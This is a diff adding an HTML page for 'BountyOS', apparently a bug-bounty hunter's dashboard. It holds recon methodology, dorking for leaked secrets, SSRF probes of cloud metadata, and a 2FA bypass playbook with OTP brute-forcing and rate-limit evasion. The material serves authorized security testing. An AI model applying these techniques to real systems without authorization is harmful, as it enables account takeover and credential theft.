@@ -1,0 +1,1186 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>BountyOS</title>
+<style>
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth}
+body{background:#0a0c0f;color:#c8d6e5;font-family:'Segoe UI',system-ui,sans-serif;font-size:14px;line-height:1.6;min-height:100vh}
+
+/* scanline */
+body::after{content:'';position:fixed;inset:0;pointer-events:none;z-index:9999;background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,0,0,.05) 2px,rgba(0,0,0,.05) 4px)}
+
+/* ── NAV ── */
+#topbar{position:sticky;top:0;z-index:200;background:rgba(8,10,13,.97);border-bottom:1px solid #1e2430;display:flex;align-items:center;gap:10px;padding:0 14px;height:48px;overflow-x:auto;scrollbar-width:none}
+#topbar::-webkit-scrollbar{display:none}
+.logo{font-family:'Courier New',monospace;font-size:13px;color:#00ff9d;letter-spacing:3px;white-space:nowrap;text-shadow:0 0 10px rgba(0,255,157,.5);flex-shrink:0}
+.logo span{color:#4a5568}
+.cur{display:inline-block;width:6px;height:12px;background:#00ff9d;animation:blink 1s step-end infinite;vertical-align:middle;margin-left:2px}
+@keyframes blink{50%{opacity:0}}
+.navbtn{background:none;border:1px solid #252d3d;color:#7a8ba0;font-family:'Courier New',monospace;font-size:10px;padding:4px 10px;border-radius:2px;cursor:pointer;white-space:nowrap;letter-spacing:1px;transition:all .15s;flex-shrink:0}
+.navbtn:hover,.navbtn.act{border-color:#00ff9d;color:#00ff9d;box-shadow:0 0 8px rgba(0,255,157,.3)}
+
+/* ── HERO ── */
+#hero{padding:28px 16px 22px;text-align:center}
+.ht{font-family:'Courier New',monospace;font-size:clamp(18px,3.5vw,36px);color:#00ff9d;letter-spacing:4px;text-shadow:0 0 18px rgba(0,255,157,.5);margin-bottom:5px}
+.hs{font-family:'Courier New',monospace;color:#4a5568;font-size:11px;letter-spacing:2px;margin-bottom:18px}
+.hstats{display:flex;justify-content:center;gap:24px;flex-wrap:wrap}
+.hsv{font-family:'Courier New',monospace;font-size:20px;color:#00e5ff;display:block;text-shadow:0 0 8px rgba(0,229,255,.4)}
+.hsl{font-size:10px;color:#4a5568;letter-spacing:1px;text-transform:uppercase}
+
+/* ── LAYOUT ── */
+#app{max-width:1200px;margin:0 auto;padding:0 14px 60px}
+.sec{display:none}
+.sec.act{display:block}
+.sh{display:flex;align-items:center;gap:8px;padding:16px 0 12px;border-bottom:1px solid #1e2430;margin-bottom:16px}
+.stag{font-family:'Courier New',monospace;font-size:9px;color:#00ff9d;border:1px solid #00ff9d;padding:2px 7px;letter-spacing:2px}
+.stitle{font-family:'Courier New',monospace;font-size:15px;color:#c8d6e5;letter-spacing:2px}
+
+/* ── CARDS ── */
+.card{background:#0f1117;border:1px solid #1e2430;border-radius:3px;padding:14px;margin-bottom:10px}
+.card:hover{border-color:#252d3d}
+.ctitle{font-family:'Courier New',monospace;font-size:12px;color:#00e5ff;margin-bottom:10px;letter-spacing:1px}
+
+/* ── GRID ── */
+.g2{display:grid;grid-template-columns:1fr 1fr;gap:10px}
+.g3{display:grid;grid-template-columns:repeat(3,1fr);gap:10px}
+@media(max-width:800px){.g3{grid-template-columns:1fr 1fr}}
+@media(max-width:550px){.g2,.g3{grid-template-columns:1fr}}
+
+/* ── BADGES ── */
+.b{font-size:9px;padding:1px 6px;border-radius:2px;font-family:'Courier New',monospace;letter-spacing:1px;display:inline-block;white-space:nowrap}
+.bc{background:rgba(255,45,107,.12);color:#ff2d6b;border:1px solid rgba(255,45,107,.3)}
+.bh{background:rgba(255,150,0,.1);color:#ff9600;border:1px solid rgba(255,150,0,.3)}
+.bm{background:rgba(255,214,0,.08);color:#ffd600;border:1px solid rgba(255,214,0,.3)}
+.bl{background:rgba(0,229,255,.06);color:#00e5ff;border:1px solid rgba(0,229,255,.25)}
+.bi{background:rgba(157,78,221,.1);color:#9d4edd;border:1px solid rgba(157,78,221,.3)}
+.bg{background:rgba(0,255,157,.07);color:#00ff9d;border:1px solid rgba(0,255,157,.25)}
+
+/* ── CHIPS ── */
+.chips{display:flex;flex-wrap:wrap;gap:5px;margin-bottom:12px}
+.chip{font-family:'Courier New',monospace;font-size:10px;padding:3px 9px;border:1px solid #252d3d;border-radius:20px;color:#7a8ba0;cursor:pointer;transition:all .12s;text-transform:uppercase;letter-spacing:1px}
+.chip:hover,.chip.on{border-color:#00e5ff;color:#00e5ff}
+
+/* ── CHECKLIST ── */
+.clgrp{margin-bottom:16px}
+.clgtitle{font-family:'Courier New',monospace;font-size:10px;color:#00ff9d;letter-spacing:2px;text-transform:uppercase;margin-bottom:6px;padding-bottom:4px;border-bottom:1px solid #1e2430}
+.ci{display:flex;align-items:flex-start;gap:8px;padding:6px 8px;border-radius:3px;cursor:pointer;transition:background .1s;user-select:none}
+.ci:hover{background:rgba(0,255,157,.04)}
+.ci.done{opacity:.38}
+.ci.done .cil{text-decoration:line-through;color:#4a5568}
+.cib{width:13px;height:13px;border:1px solid #252d3d;border-radius:2px;flex-shrink:0;margin-top:3px;display:flex;align-items:center;justify-content:center;font-size:9px;color:#00ff9d;transition:all .12s}
+.ci.done .cib{background:rgba(0,255,157,.15);border-color:#00ff9d}
+.cil{font-size:12px;color:#c8d6e5;flex:1}
+.cim{font-size:9px;color:#4a5568;font-family:'Courier New',monospace;white-space:nowrap;margin-top:2px}
+
+/* ── PROGRESS ── */
+.pbw{margin:8px 0 16px}
+.pb{height:2px;background:#1e2430;border-radius:2px;overflow:hidden}
+.pbf{height:100%;background:linear-gradient(90deg,#00ff9d,#00e5ff);transition:width .4s;box-shadow:0 0 6px rgba(0,255,157,.4)}
+.pbl{font-family:'Courier New',monospace;font-size:10px;color:#7a8ba0;margin-top:4px}
+
+/* ── SEVERITY MATRIX ── */
+.mx{display:grid;grid-template-columns:repeat(4,1fr);gap:7px}
+@media(max-width:500px){.mx{grid-template-columns:repeat(2,1fr)}}
+.mc{text-align:center;padding:12px 6px;border-radius:3px;border:1px solid}
+.mcrit{border-color:rgba(255,45,107,.3);background:rgba(255,45,107,.05)}
+.mhigh{border-color:rgba(255,150,0,.3);background:rgba(255,150,0,.04)}
+.mmed{border-color:rgba(255,214,0,.3);background:rgba(255,214,0,.04)}
+.mlow{border-color:rgba(0,229,255,.3);background:rgba(0,229,255,.03)}
+.mlbl{font-family:'Courier New',monospace;font-size:9px;letter-spacing:2px;margin-bottom:3px}
+.mval{font-size:18px;font-weight:700;font-family:'Courier New',monospace}
+.mdesc{font-size:9px;color:#7a8ba0;margin-top:2px}
+
+/* ── VULN ACCORDION ── */
+.vacc{background:#0f1117;border:1px solid #1e2430;border-radius:3px;margin-bottom:8px;overflow:hidden}
+.vacchead{display:flex;align-items:center;gap:8px;padding:11px 14px;cursor:pointer;transition:background .1s;flex-wrap:wrap;gap:6px}
+.vacchead:hover{background:rgba(255,255,255,.02)}
+.vaccname{font-family:'Courier New',monospace;font-size:12px;color:#00e5ff;flex:1;min-width:180px}
+.vaccbody{padding:0 14px;max-height:0;overflow:hidden;transition:max-height .3s,padding .2s}
+.vaccbody.open{max-height:700px;padding:0 14px 14px}
+.vdesc{color:#7a8ba0;font-size:12px;margin-bottom:10px;line-height:1.7}
+.vsteps{padding-left:16px;color:#7a8ba0;font-size:11px;line-height:2.1;margin-bottom:8px}
+.vimp{color:#ff2d6b;font-size:11px;font-family:'Courier New',monospace}
+
+/* ── PAYLOAD LIST ── */
+.pi{display:flex;align-items:center;gap:8px;padding:7px 10px;background:#080a0c;border:1px solid #1e2430;border-radius:2px;margin-bottom:4px;transition:border-color .12s}
+.pi:hover{border-color:#252d3d}
+.pil{font-family:'Courier New',monospace;font-size:9px;color:#4a5568;min-width:160px;flex-shrink:0}
+.piv{font-family:'Courier New',monospace;font-size:11px;color:#ffd600;flex:1;word-break:break-all}
+.cpbtn{background:none;border:none;color:#4a5568;cursor:pointer;font-size:13px;padding:2px 4px;transition:color .12s;flex-shrink:0}
+.cpbtn:hover{color:#00ff9d}
+
+/* ── DORK LIST ── */
+.di{display:flex;align-items:center;gap:8px;padding:7px 10px;background:#080a0c;border:1px solid #1e2430;border-radius:2px;margin-bottom:4px;cursor:pointer;transition:border-color .12s}
+.di:hover{border-color:#ffd600}
+.dil{font-family:'Courier New',monospace;font-size:9px;color:#4a5568;min-width:150px;flex-shrink:0}
+.div2{font-family:'Courier New',monospace;font-size:11px;color:#ffd600;flex:1;word-break:break-all}
+
+/* ── TOOL ROWS ── */
+.ti{display:flex;align-items:flex-start;gap:10px;padding:11px 12px;background:#0f1117;border:1px solid #1e2430;border-radius:3px;margin-bottom:7px}
+.tiicon{width:30px;height:30px;background:#141720;border-radius:2px;display:flex;align-items:center;justify-content:center;font-size:15px;flex-shrink:0}
+.tiname{font-family:'Courier New',monospace;font-size:12px;color:#00e5ff}
+.tidesc{font-size:11px;color:#4a5568;margin-top:2px}
+.ticode{font-family:'Courier New',monospace;font-size:10px;color:#00ff9d;background:#080a0c;border:1px solid #1e2430;border-left:2px solid #00ff9d;padding:6px 10px;margin-top:6px;border-radius:0 2px 2px 0;white-space:pre;overflow-x:auto}
+
+/* ── METHOD STEPS ── */
+.mlist{list-style:none}
+.mlist li{display:flex;gap:8px;padding:8px 0;border-bottom:1px solid #1e2430;align-items:flex-start}
+.mlist li:last-child{border-bottom:none}
+.mnum{font-family:'Courier New',monospace;font-size:10px;color:#00ff9d;width:24px;flex-shrink:0;margin-top:2px}
+.mtitle{color:#c8d6e5;font-size:12px;margin-bottom:3px;font-weight:600}
+.mdesc2{color:#7a8ba0;font-size:11px;line-height:1.6}
+
+/* ── TERMINAL ── */
+.term{background:#070a0d;border:1px solid #1e2430;border-radius:3px;overflow:hidden;margin:8px 0}
+.tbar{background:#141720;padding:5px 10px;display:flex;align-items:center;gap:5px;border-bottom:1px solid #1e2430}
+.td{width:8px;height:8px;border-radius:50%}
+.td.r{background:#ff5f57}.td.y{background:#febc2e}.td.g{background:#28c840}
+.tlbl{font-family:'Courier New',monospace;font-size:9px;color:#4a5568;margin-left:5px}
+.tbody{padding:10px 14px;font-family:'Courier New',monospace;font-size:11px;line-height:1.7;color:#00ff9d;white-space:pre-wrap}
+.tout{color:#7a8ba0}
+
+/* ── ARTICLES ── */
+.ac{background:#0f1117;border:1px solid #1e2430;border-radius:3px;padding:12px;display:flex;flex-direction:column;gap:5px;transition:border-color .15s,transform .1s}
+.ac:hover{border-color:#00e5ff;transform:translateY(-1px)}
+.actag{font-family:'Courier New',monospace;font-size:9px;color:#9d4edd;letter-spacing:1px;text-transform:uppercase}
+.actitle{font-size:12px;color:#c8d6e5;font-weight:600;line-height:1.4}
+.acdesc{font-size:11px;color:#7a8ba0;line-height:1.6}
+.acmeta{font-family:'Courier New',monospace;font-size:9px;color:#4a5568}
+
+/* ── REPORT ── */
+.fr{display:flex;gap:6px;margin-bottom:6px;flex-wrap:wrap}
+.fr input,.fr select,.fr textarea{background:#0f1117;border:1px solid #252d3d;color:#c8d6e5;font-family:'Courier New',monospace;font-size:11px;padding:7px 10px;border-radius:3px;outline:none;flex:1;min-width:100px;transition:border-color .15s}
+.fr input:focus,.fr select:focus,.fr textarea:focus{border-color:#00ff9d}
+.fr textarea{min-height:60px;resize:vertical}
+.fr select option{background:#0f1117}
+.btn{background:rgba(0,255,157,.07);border:1px solid rgba(0,255,157,.3);color:#00ff9d;font-family:'Courier New',monospace;font-size:10px;padding:7px 13px;border-radius:3px;cursor:pointer;letter-spacing:1px;text-transform:uppercase;transition:all .12s}
+.btn:hover{background:rgba(0,255,157,.14);box-shadow:0 0 8px rgba(0,255,157,.25)}
+.btnd{background:rgba(255,45,107,.07);border-color:rgba(255,45,107,.3);color:#ff2d6b}
+.btnd:hover{background:rgba(255,45,107,.14)}
+.btnsm{padding:3px 8px;font-size:9px}
+.rrow{display:flex;align-items:flex-start;gap:8px;padding:9px 12px;border-bottom:1px solid #1e2430;flex-wrap:wrap}
+.rdate{font-family:'Courier New',monospace;font-size:9px;color:#4a5568;white-space:nowrap;min-width:75px;margin-top:2px;flex-shrink:0}
+.rtitle{color:#c8d6e5;font-size:12px;margin-bottom:2px}
+.rsub{font-size:10px;color:#4a5568}
+
+/* ── RECON SCRIPTS ── */
+.rs{background:#0f1117;border:1px solid #1e2430;border-radius:3px;padding:12px;margin-bottom:10px}
+.rstitle{font-family:'Courier New',monospace;font-size:12px;color:#00e5ff;margin-bottom:3px}
+.rsdesc{font-size:11px;color:#7a8ba0;margin-bottom:8px}
+
+/* ── UTILS ── */
+::-webkit-scrollbar{width:4px;height:4px}
+::-webkit-scrollbar-track{background:#0a0c0f}
+::-webkit-scrollbar-thumb{background:#252d3d;border-radius:2px}
+.t2{color:#7a8ba0}.t3{color:#4a5568}.tg{color:#00ff9d}.tc{color:#00e5ff}.tr{color:#ff2d6b}.ty{color:#ffd600}
+.fm{font-family:'Courier New',monospace}.ts{font-size:11px}.ts2{font-size:10px}
+.mt8{margin-top:8px}.mt12{margin-top:12px}.mb8{margin-bottom:8px}.mb12{margin-bottom:12px}
+.fb{display:flex;justify-content:space-between;align-items:center}
+</style>
+</head>
+<body>
+
+<div id="topbar">
+  <div class="logo">BOUNTY<span>/</span>OS<span class="cur"></span></div>
+  <button class="navbtn act" data-s="dashboard">DASHBOARD</button>
+  <button class="navbtn" data-s="checklist">CHECKLIST</button>
+  <button class="navbtn" data-s="methodology">METHODOLOGY</button>
+  <button class="navbtn" data-s="vulndb">VULN DB</button>
+  <button class="navbtn" data-s="payloads">PAYLOADS</button>
+  <button class="navbtn" data-s="reports">REPORTS</button>
+  <button class="navbtn" data-s="dorks">DORKS</button>
+  <button class="navbtn" data-s="tools">TOOLS</button>
+  <button class="navbtn" data-s="articles">ARTICLES</button>
+  <button class="navbtn" data-s="recon">RECON</button>
+</div>
+
+<div id="hero">
+  <div class="ht">[ BountyOS v2.6 ]</div>
+  <div class="hs">// ETHICAL HACKER COMMAND CENTER // AUTHORIZED USE ONLY</div>
+  <div class="hstats">
+    <div><span class="hsv" id="sChecks">0</span><span class="hsl">Checks Done</span></div>
+    <div><span class="hsv" id="sVulns">10</span><span class="hsl">Vuln Types</span></div>
+    <div><span class="hsv" id="sReports">0</span><span class="hsl">Reports</span></div>
+    <div><span class="hsv tg" id="sProg">0%</span><span class="hsl">Progress</span></div>
+  </div>
+</div>
+
+<div id="app">
+
+<!-- DASHBOARD -->
+<div id="sec-dashboard" class="sec act">
+  <div class="sh"><span class="stag">SYS</span><span class="stitle">OPERATOR DASHBOARD</span></div>
+  <div class="g2">
+    <div class="card">
+      <div class="ctitle">▸ QUICK STATUS</div>
+      <div class="term">
+        <div class="tbar"><span class="td r"></span><span class="td y"></span><span class="td g"></span><span class="tlbl">session@bountyos:~</span></div>
+        <div class="tbody"><span class="tout">$ whoami
+  honor // bug bounty hunter
+$ tools
+  burpsuite / nuclei / subfinder
+$ target</span>
+  <span id="dTarget" class="tg">not set</span>
+<span class="tout">$ checklist</span>
+  <span id="dProg" class="tc">loading...</span></div>
+      </div>
+      <div class="fr mt8">
+        <input type="text" id="targetIn" placeholder="Set target (e.g. bugcrowdtesting.locals.com)" />
+        <button class="btn" onclick="setTarget()">SET</button>
+      </div>
+    </div>
+    <div class="card">
+      <div class="ctitle">▸ SEVERITY MATRIX (CVSS)</div>
+      <div class="mx">
+        <div class="mc mcrit"><div class="mlbl tr">CRITICAL</div><div class="mval tr">9–10</div><div class="mdesc">RCE, SQLi, Full ATO</div></div>
+        <div class="mc mhigh"><div class="mlbl" style="color:#ff9600">HIGH</div><div class="mval" style="color:#ff9600">7–8.9</div><div class="mdesc">SSRF, IDOR, Auth Bypass</div></div>
+        <div class="mc mmed"><div class="mlbl ty">MEDIUM</div><div class="mval ty">4–6.9</div><div class="mdesc">XSS, Rate Limit, Info Disc</div></div>
+        <div class="mc mlow"><div class="mlbl tc">LOW</div><div class="mval tc">0.1–3.9</div><div class="mdesc">Headers, Verbose Errors</div></div>
+      </div>
+    </div>
+  </div>
+  <div class="g3 mt12">
+    <div class="card" style="border-left:2px solid #ff2d6b">
+      <div class="ctitle">⚡ HIGH VALUE BUGS</div>
+      <div class="ts t2">
+        <div class="mb8">🔴 <span class="fm tc">2FA/MFA Bypass</span> — response manipulation</div>
+        <div class="mb8">🔴 <span class="fm tc">IDOR on user IDs</span> — horizontal priv esc</div>
+        <div class="mb8">🔴 <span class="fm tc">SSRF via URL params</span> — internal recon</div>
+        <div class="mb8">🔴 <span class="fm tc">JWT algorithm none</span> — auth bypass</div>
+        <div>🔴 <span class="fm tc">Admin invite token</span> — broken authz</div>
+      </div>
+    </div>
+    <div class="card" style="border-left:2px solid #ffd600">
+      <div class="ctitle">📡 RECON TOOLS</div>
+      <div class="ts t2 fm">
+        <div class="mb8"><span class="tg">subfinder</span> <span class="t3">// subdomain enum</span></div>
+        <div class="mb8"><span class="tg">httpx</span> <span class="t3">// probe alive hosts</span></div>
+        <div class="mb8"><span class="tg">waybackurls</span> <span class="t3">// historical URLs</span></div>
+        <div class="mb8"><span class="tg">nuclei</span> <span class="t3">// vuln scanning</span></div>
+        <div class="mb8"><span class="tg">gf</span> <span class="t3">// grep patterns</span></div>
+        <div><span class="tg">ffuf</span> <span class="t3">// fuzzing</span></div>
+      </div>
+    </div>
+    <div class="card" style="border-left:2px solid #00e5ff">
+      <div class="ctitle">🛡 OWASP TOP 10 (2021)</div>
+      <div class="ts t2">
+        <div class="mb8">A01 <span style="color:#c8d6e5">Broken Access Control</span></div>
+        <div class="mb8">A02 <span style="color:#c8d6e5">Cryptographic Failures</span></div>
+        <div class="mb8">A03 <span style="color:#c8d6e5">Injection</span></div>
+        <div class="mb8">A05 <span style="color:#c8d6e5">Security Misconfiguration</span></div>
+        <div class="mb8">A07 <span style="color:#c8d6e5">Identification Failures</span></div>
+        <div>A10 <span style="color:#c8d6e5">SSRF</span></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- CHECKLIST -->
+<div id="sec-checklist" class="sec">
+  <div class="sh"><span class="stag">CHECK</span><span class="stitle">BUG BOUNTY CHECKLIST</span></div>
+  <div class="fb mb8">
+    <div class="chips" id="clChips">
+      <span class="chip on" data-c="all">ALL</span>
+      <span class="chip" data-c="recon">RECON</span>
+      <span class="chip" data-c="auth">AUTH</span>
+      <span class="chip" data-c="session">SESSION</span>
+      <span class="chip" data-c="xss">XSS</span>
+      <span class="chip" data-c="ssrf">SSRF</span>
+      <span class="chip" data-c="idor">IDOR</span>
+      <span class="chip" data-c="api">API</span>
+      <span class="chip" data-c="business">BIZ LOGIC</span>
+      <span class="chip" data-c="upload">FILE UPLOAD</span>
+    </div>
+    <button class="btn btnsm btnd" onclick="resetCL()">RESET</button>
+  </div>
+  <div class="pbw"><div class="pb"><div class="pbf" id="pbFill" style="width:0%"></div></div><div class="pbl" id="pbLbl">0 / 0 complete</div></div>
+  <div id="clOut"></div>
+</div>
+
+<!-- METHODOLOGY -->
+<div id="sec-methodology" class="sec">
+  <div class="sh"><span class="stag">METHOD</span><span class="stitle">HUNTING METHODOLOGY</span></div>
+  <div class="g2">
+    <div class="card">
+      <div class="ctitle">⬡ PHASE 1 — PASSIVE RECON <span class="b bg" style="margin-left:4px">NO FOOTPRINT</span></div>
+      <ul class="mlist">
+        <li><span class="mnum">[01]</span><div><div class="mtitle">Scope Analysis</div><div class="mdesc2">Read program policy carefully. Note in-scope domains, excluded endpoints, reward tiers, and rules of engagement.</div></div></li>
+        <li><span class="mnum">[02]</span><div><div class="mtitle">Subdomain Enumeration</div><div class="mdesc2">Run subfinder, assetfinder, amass. Cross-reference crt.sh certificate transparency. Target 200–500+ unique subdomains.</div></div></li>
+        <li><span class="mnum">[03]</span><div><div class="mtitle">GitHub Dorking</div><div class="mdesc2">Search "target.com" api_key / password / secret on GitHub. Look for hardcoded secrets, database creds, private keys.</div></div></li>
+        <li><span class="mnum">[04]</span><div><div class="mtitle">Shodan / FOFA Recon</div><div class="mdesc2">Query ssl.cert.subject.cn:target.com — find exposed admin panels, S3 buckets, Jenkins, Elasticsearch.</div></div></li>
+        <li><span class="mnum">[05]</span><div><div class="mtitle">Postman / API Docs</div><div class="mdesc2">site:documenter.getpostman.com "target.com" — find leaked API collections with undocumented endpoints.</div></div></li>
+      </ul>
+    </div>
+    <div class="card">
+      <div class="ctitle">⬡ PHASE 2 — ACTIVE RECON <span class="b bh" style="margin-left:4px">PROBE</span></div>
+      <ul class="mlist">
+        <li><span class="mnum">[01]</span><div><div class="mtitle">Live Host Probing</div><div class="mdesc2">cat subs.txt | httpx -mc 200,403 -tech-detect — filter alive hosts and detect tech stack.</div></div></li>
+        <li><span class="mnum">[02]</span><div><div class="mtitle">Wayback URL Extraction</div><div class="mdesc2">cat subs.txt | waybackurls | httpx -mc 200 | tee wb.txt — find historical forgotten endpoints.</div></div></li>
+        <li><span class="mnum">[03]</span><div><div class="mtitle">JS File Analysis</div><div class="mdesc2">cat wb.txt | grep .js | tee js.txt then nuclei -l js.txt -t exposures/ to find API keys in bundles.</div></div></li>
+        <li><span class="mnum">[04]</span><div><div class="mtitle">Parameter Discovery</div><div class="mdesc2">Use gau, paramspider, arjun to find hidden parameters. Filter all URLs containing = signs.</div></div></li>
+        <li><span class="mnum">[05]</span><div><div class="mtitle">Tech Fingerprinting</div><div class="mdesc2">Wappalyzer + WhatWeb. Identify CMS versions and frameworks. Map to known CVEs.</div></div></li>
+      </ul>
+    </div>
+    <div class="card">
+      <div class="ctitle">⬡ PHASE 3 — VULNERABILITY HUNTING <span class="b bc" style="margin-left:4px">EXPLOIT</span></div>
+      <ul class="mlist">
+        <li><span class="mnum">[01]</span><div><div class="mtitle">Authentication Testing</div><div class="mdesc2">Test 2FA bypass via response manipulation. Check OTP brute force, rate limiting bypass via header variation.</div></div></li>
+        <li><span class="mnum">[02]</span><div><div class="mtitle">Authorization / IDOR</div><div class="mdesc2">Replace user IDs in API calls. Test horizontal and vertical privilege escalation on all object references.</div></div></li>
+        <li><span class="mnum">[03]</span><div><div class="mtitle">Injection Testing</div><div class="mdesc2">Test SQLi, XSS, SSTI, command injection. Use Burp Intruder systematically on all user-controlled parameters.</div></div></li>
+        <li><span class="mnum">[04]</span><div><div class="mtitle">SSRF Testing</div><div class="mdesc2">Find url=, proxy=, redirect=, host=, img= parameters. Probe 127.0.0.1, 169.254.169.254 (AWS metadata).</div></div></li>
+        <li><span class="mnum">[05]</span><div><div class="mtitle">Business Logic</div><div class="mdesc2">Test price manipulation, coupon abuse, race conditions, unauthorized state transitions.</div></div></li>
+      </ul>
+    </div>
+    <div class="card">
+      <div class="ctitle">⬡ PHASE 4 — REPORTING <span class="b bl" style="margin-left:4px">DISCLOSE</span></div>
+      <ul class="mlist">
+        <li><span class="mnum">[01]</span><div><div class="mtitle">Impact Assessment</div><div class="mdesc2">Document real-world impact clearly. Don't overclaim. Defensible Medium beats inflated Critical. Calculate CVSS honestly.</div></div></li>
+        <li><span class="mnum">[02]</span><div><div class="mtitle">PoC Creation</div><div class="mdesc2">Full Burp Suite request/response capture. Screen recording or screenshots proving exploitation.</div></div></li>
+        <li><span class="mnum">[03]</span><div><div class="mtitle">Report Writing</div><div class="mdesc2">Title, description, steps to reproduce, impact, CVSS, CWE, mitigation. Natural human prose — no overclaiming.</div></div></li>
+        <li><span class="mnum">[04]</span><div><div class="mtitle">Responsible Disclosure</div><div class="mdesc2">Submit via Bugcrowd/HackerOne (handle: Honor). Give vendor 90 days before disclosure.</div></div></li>
+      </ul>
+      <div class="term mt8">
+        <div class="tbar"><span class="td r"></span><span class="td y"></span><span class="td g"></span><span class="tlbl">report-template.md</span></div>
+        <div class="tbody tout" style="font-size:10px">Title: [Vuln Type] in [Endpoint] leads to [Impact]
+Severity: High (CVSS 7.x) | CWE-XXX
+
+Steps to Reproduce:
+1. Navigate to https://target.com/endpoint
+2. Intercept request with Burp Suite
+3. Modify parameter X to value Y
+4. Observe [impact]
+
+Impact:
+An attacker can [action] leading to [consequence].
+
+Mitigation:
+Implement [fix].</div>
+      </div>
+    </div>
+    <div class="card" style="grid-column:1/-1">
+      <div class="ctitle">⚡ 2FA/MFA BYPASS PLAYBOOK</div>
+      <div class="g2 mt8">
+        <div>
+          <div class="tg fm ts mb8">// Method 1: Response Manipulation</div>
+          <ol style="padding-left:16px;color:#7a8ba0;font-size:12px;line-height:2.1">
+            <li>Login with valid creds, reach 2FA page</li>
+            <li>Enter any wrong OTP and submit</li>
+            <li>In Burp: Right-click → Do Intercept → Response to this request</li>
+            <li>Change HTTP status to 200 OK</li>
+            <li>Replace body with success JSON (see Payloads tab)</li>
+            <li>Forward — check if session is granted</li>
+          </ol>
+        </div>
+        <div>
+          <div class="tg fm ts mb8">// Method 2: OTP Reuse / Brute Force</div>
+          <ol style="padding-left:16px;color:#7a8ba0;font-size:12px;line-height:2.1">
+            <li>Capture valid OTP request in Burp</li>
+            <li>Resend same OTP immediately — check if reuse allowed</li>
+            <li>Test values: null, empty, 000000, 123456</li>
+            <li>Send to Intruder, brute-force 6-digit range if no rate limit</li>
+            <li>Vary Accept-Language per request to bypass rate limiting</li>
+            <li>Test: email+1@domain.com for registration-based limits</li>
+          </ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- VULN DB -->
+<div id="sec-vulndb" class="sec">
+  <div class="sh"><span class="stag">VULN</span><span class="stitle">VULNERABILITY DATABASE</span></div>
+  <div class="chips" id="vChips">
+    <span class="chip on" data-v="all">ALL</span>
+    <span class="chip" data-v="critical">CRITICAL</span>
+    <span class="chip" data-v="high">HIGH</span>
+    <span class="chip" data-v="medium">MEDIUM</span>
+  </div>
+  <div id="vOut"></div>
+</div>
+
+<!-- PAYLOADS -->
+<div id="sec-payloads" class="sec">
+  <div class="sh"><span class="stag">PAYLOADS</span><span class="stitle">PAYLOAD REFERENCE</span></div>
+  <div class="chips" id="pChips">
+    <span class="chip on" data-p="all">ALL</span>
+    <span class="chip" data-p="xss">XSS</span>
+    <span class="chip" data-p="sqli">SQLi</span>
+    <span class="chip" data-p="ssrf">SSRF</span>
+    <span class="chip" data-p="2fa">2FA BYPASS</span>
+    <span class="chip" data-p="header">HEADERS</span>
+  </div>
+  <div id="pOut"></div>
+</div>
+
+<!-- REPORTS -->
+<div id="sec-reports" class="sec">
+  <div class="sh"><span class="stag">REPORTS</span><span class="stitle">FINDING TRACKER</span></div>
+  <div class="card mb12">
+    <div class="ctitle">⊕ LOG NEW FINDING</div>
+    <div class="fr"><input type="text" id="rTitle" placeholder="Finding title" /><select id="rSev"><option value="critical">CRITICAL</option><option value="high">HIGH</option><option value="medium" selected>MEDIUM</option><option value="low">LOW</option><option value="info">INFO</option></select></div>
+    <div class="fr"><input type="text" id="rTarget" placeholder="Target / endpoint" /><input type="text" id="rCvss" placeholder="CVSS score" /><input type="text" id="rCwe" placeholder="CWE-XXX" /></div>
+    <div class="fr"><textarea id="rDesc" placeholder="Description & impact..."></textarea></div>
+    <div class="fr">
+      <select id="rStatus"><option value="draft">DRAFT</option><option value="submitted">SUBMITTED</option><option value="triaged">TRIAGED</option><option value="accepted">ACCEPTED</option><option value="duplicate">DUPLICATE</option><option value="invalid">INVALID</option></select>
+      <input type="text" id="rProgram" placeholder="Program (e.g. Bugcrowd - locals.com)" />
+      <button class="btn" onclick="addReport()">LOG FINDING</button>
+    </div>
+  </div>
+  <div id="rOut"></div>
+</div>
+
+<!-- DORKS -->
+<div id="sec-dorks" class="sec">
+  <div class="sh"><span class="stag">DORKS</span><span class="stitle">RECON DORKS</span></div>
+  <div class="chips" id="dChips">
+    <span class="chip on" data-d="all">ALL</span>
+    <span class="chip" data-d="github">GITHUB</span>
+    <span class="chip" data-d="google">GOOGLE</span>
+    <span class="chip" data-d="shodan">SHODAN</span>
+    <span class="chip" data-d="fofa">FOFA</span>
+    <span class="chip" data-d="postman">POSTMAN</span>
+  </div>
+  <div class="t3 fm ts2 mb8">Replace {target} with your domain. Click any row to copy.</div>
+  <div id="dOut"></div>
+</div>
+
+<!-- TOOLS -->
+<div id="sec-tools" class="sec">
+  <div class="sh"><span class="stag">TOOLS</span><span class="stitle">TOOLKIT REFERENCE</span></div>
+  <div id="tOut"></div>
+</div>
+
+<!-- ARTICLES -->
+<div id="sec-articles" class="sec">
+  <div class="sh"><span class="stag">INTEL</span><span class="stitle">KNOWLEDGE BASE</span></div>
+  <div class="chips" id="aChips">
+    <span class="chip on" data-a="all">ALL</span>
+    <span class="chip" data-a="ssrf">SSRF</span>
+    <span class="chip" data-a="auth">AUTH</span>
+    <span class="chip" data-a="recon">RECON</span>
+    <span class="chip" data-a="api">API</span>
+    <span class="chip" data-a="business">BIZ LOGIC</span>
+  </div>
+  <div class="g3" id="aOut"></div>
+</div>
+
+<!-- RECON -->
+<div id="sec-recon" class="sec">
+  <div class="sh"><span class="stag">RECON</span><span class="stitle">AUTOMATION SCRIPTS</span></div>
+  <div class="g2" id="rcOut"></div>
+</div>
+
+</div><!-- /app -->
+
+<script>
+// ── NAV ──────────────────────────────────────
+document.querySelectorAll('.navbtn').forEach(function(b) {
+  b.addEventListener('click', function() {
+    document.querySelectorAll('.navbtn').forEach(function(x){x.classList.remove('act')});
+    document.querySelectorAll('.sec').forEach(function(x){x.classList.remove('act')});
+    b.classList.add('act');
+    document.getElementById('sec-' + b.dataset.s).classList.add('act');
+  });
+});
+
+// ── STORAGE ──────────────────────────────────
+function load(k,d){try{var v=localStorage.getItem('bos3_'+k);return v?JSON.parse(v):d;}catch(e){return d;}}
+function save(k,v){try{localStorage.setItem('bos3_'+k,JSON.stringify(v));}catch(e){}}
+
